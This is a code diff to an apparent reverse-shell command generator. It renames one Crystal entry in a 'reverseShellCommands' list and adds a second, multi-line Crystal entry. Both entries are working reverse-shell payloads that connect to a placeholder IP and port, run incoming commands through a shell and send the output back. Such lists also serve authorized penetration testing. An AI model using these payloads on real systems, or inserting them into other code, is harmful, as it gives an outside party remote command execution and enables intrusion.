@@ -361,10 +361,15 @@ const reverseShellCommands = withCommandType(
             "meta": ["linux", "mac", "windows"]
         },
         {
-            "name": "Crystal",
+            "name": "Crystal (system)",
             "command": "crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{ip}\",{port});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'",
             "meta": ["linux", "windows", "mac"]
         },
+        {
+            "name": "Crystal (code)",
+            "command": "require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"{ip}\", {port})\nloop do \n  m, l = c.receive\n  p = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n  c << p.output.gets_to_end\nend",
+            "meta": ["linux", "mac"]
+        }
     ]
 );
 
